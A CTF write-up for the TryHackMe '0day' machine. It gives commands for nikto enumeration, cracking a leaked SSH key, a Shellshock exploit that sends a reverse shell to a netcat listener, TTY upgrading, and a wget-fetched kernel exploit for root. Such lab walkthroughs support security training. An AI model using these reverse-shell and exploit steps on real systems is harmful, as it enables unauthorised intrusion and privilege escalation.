# 0day | CTF Machine 

## Tools && Sources

1. metasploit
2. ssh2john
3. ssh
3. nikto
4. nc 
5- linpeas | `https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/linpeas.sh`

## steps to get two flags 
```bash
[+] open metasploit by writing `msfconsole` in the terminal 
[+] search for ftp_version 
[+] ftp is not open | bad news  
[+] search for http_version
[+] http is open 
[+] continue searching imap_version & pop3_version & mysql_version all is down | but ssh_version 
[+] ssh is open 
[+] scan with nmap to check if there's anyother open port we missed or something . 
[+] ssh & http only opens 
[+] nikto -h http://10.10.x.x:80/
[+] there's a secret, backup, admin folders avaliable 
[+] check these folders nothing important but backup contains private key | save that key into a file call it id_rsa
[+] ssh2john id_rsa > private.hash that file will give you a password `letmein`  this password won't be necessary in the attack . so forget it  
[+] john --wordlist=/usr/share/wordlist/rockyou.txt private.hash 
[+] what else in nikto | OMG there's an exploit called shellshock | Uncommon header '93e4r0-cve-2014-6271' found
[+] google it | 93e4r0-cve-2014-6271 will lead you to a github page `https://github.com/b4keSn4ke/CVE-2014-6271`
[+] git clone https://github.com/b4keSn4ke/CVE-2014-6271
[+] cd  CVE-2014-6271 && python shellshock.py -h | it runs that way `python shellshock.py LHOST LPORT TARGET_URI`
[+] setup a netcat listener first | nc -nlvp 4444 
[+] open another terminal and put the next line and click enter . 
[+] python shellshock.py 10.8.77.235 4444 http://10.10.166.249/cgi-bin/test.cgi
[+] you've got a shell 
[+] let's make that shell flexiable 
[1] SHELL=/bin/bash script -q /dev/null
[2] python -c 'import pty; pty.spawn("/bin/bash");'
[3] CTRl + Z  
[4] stty raw -echo && fg 
[5] ENTER
[6] ENTER 
[7] export TERM=xterm
[+] cd /home | ls and there's a user called ryan | cd ryan | ls 
[+] you got a file called user.txt | cat user.txt | flag 1 
[+] go to /tmp | upload linpeas.sh file to start enumarte the machine looking for something to elevate your privileges to root
[+] Ooooh linux version is old `3.13.0-32-generic`
[+] google it | there's an exploit on exploit-db `https://www.exploit-db.com/exploits/37292`
```
## STEP-1
```bash
msfconsole
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_19_00-Kali-Linux-2020.4-vbox-amd64%20(7_11_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_18_35-Kali-Linux-2020.4-vbox-amd64%20(7_11_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_19_25-.png">

## STEP-2
```bash

nikto -h http://10.10.x.x:80/
```
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_17_59-Kali-Linux-2020.4-vbox-amd64%20(7_11_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">

## STEP-3
```bash
header exploit exist 93e4r0-cve-2014-6271 
git clone https://github.com/b4keSn4ke/CVE-2014-6271
cd CVE-2014-6271
nc -nlvp 4444
open another terminal and put command bellow into it and click enter 
python shellshock.py 10.8.77.235 4444 http://10.10.x.x/cgi-bin/test.cgi
you'll get a shell
let's spawn that shell | follow the next 7 steps and you'll got a shell 
[1] SHELL=/bin/bash script -q /dev/null
[2] python -c 'import pty; pty.spawn("/bin/bash");'
[3] CTRl + Z  
[4] stty raw -echo && fg 
[5] ENTER
[6] ENTER 
[7] export TERM=xterm
```
## STEP-4
```bash 
go to /home/ryan | cat user.txt | glag-1
then go to /tmp directory 
and upload linpeas.sh then run linpeas.sh file 
[*] `bash linpeas.sh | tee output.txt`
you'll notice that linux version is old 
search for exploit and you will find an exploit on exploit-db site | download it and upload to the victim machine using `wget`
then gcc 37292.c -o exploit 
[*] ./exploit 
run exploit using and you will get a shell 
go to root folder 
cat root.txt 
```

<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_22_14-Kali-Linux-2020.4-vbox-amd64%20(7_11_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
<img src="https://github.com/alauthor/Tryhackme-CTF/blob/main/0day/imgs/2022-07-24%2018_37_54-Kali-Linux-2020.4-vbox-amd64%20(7_11_2022)%20%5BRunning%5D%20-%20Oracle%20VM%20VirtualBox.png">
